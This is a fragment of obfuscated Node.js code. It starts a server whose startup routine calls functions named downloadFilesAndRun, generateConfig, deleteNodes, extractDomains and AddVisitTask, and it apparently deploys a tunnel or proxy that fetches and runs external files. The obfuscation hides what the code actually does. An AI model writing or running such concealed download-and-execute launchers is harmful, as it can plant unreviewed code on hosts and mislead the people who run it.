console[_0x4a2806(0xed)](_0x4a2806(0x112)+_0x2eea08['message']),null;}}async function startserver(){const _0x2e6267=_0x7a85c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x25ec21){console[_0x2e6267(0xed)](_0x2e6267(0xb9),_0x25ec21);}}startserver()[_0x7a85c(0xea)](_0x998fe1=>{const _0x3336da=_0x7a85c;console[_0x3336da(0xed)](_0x3336da(0x11c),_0x998fe1);}),app[_0x7a85c(0x10a)](PORT,()=>console[_0x7a85c(0xc8)](_0x7a85c(0x136)+PORT+'!'));
